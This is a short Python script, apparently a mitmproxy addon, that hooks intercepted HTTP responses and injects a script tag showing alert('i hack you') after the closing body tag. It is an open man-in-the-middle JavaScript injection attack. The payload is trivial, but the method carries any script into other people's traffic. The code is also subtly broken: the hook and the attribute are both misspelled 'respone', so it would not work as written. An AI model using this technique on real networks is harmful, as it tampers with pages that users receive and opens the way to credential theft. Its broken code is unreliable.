import mitmproxy 

def respone(flow):
	flow.respone.content= flow.respone.content.replace(b"</body>",b"</body><script>alert('i hack you')</script>")
